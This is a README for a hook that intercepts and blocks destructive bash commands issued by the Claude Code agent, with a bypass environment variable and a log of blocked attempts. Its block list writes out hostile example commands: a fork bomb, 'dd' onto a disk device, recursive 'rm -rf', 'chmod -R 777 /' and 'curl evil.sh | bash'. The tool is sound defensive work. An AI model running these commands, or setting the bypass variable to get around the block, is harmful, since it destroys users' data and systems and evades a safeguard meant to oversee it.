# Claude Code Destructive Command Hook

A pre-tool-use hook for **Claude Code** that intercepts and blocks destructive bash commands before they execute.

## Setup (3 steps)

1. `bash install.sh`
2. Restart Claude Code
3. Destructive commands are now blocked automatically

## What It Blocks

| Pattern | Example | Severity |
|---------|---------|----------|
| Recursive `rm -rf /` | `rm -rf /var/log/*` | 🔴 System-kill |
| Fork bombs | `:(){ :\|:& };:` | 🔴 System-kill |
| `dd` to block devices | `dd if=/dev/zero of=/dev/sda` | 🔴 Data loss |
| `chmod -R 777 /` | `chmod -R 777 /` | 🔴 Security hole |
| `curl \| bash` | `curl evil.sh \| bash` | 🔴 Supply chain |
| Force push | `git push --force origin main` | 🟡 History rewrite |

## Bypass

If you genuinely need a blocked command:

```bash
export CLAUDE_ALLOW_DESTRUCTIVE=1
# Then run the command in Claude Code
```

## Logs

Blocked attempts are logged to `~/.claude/blocked_commands.log` for auditing.
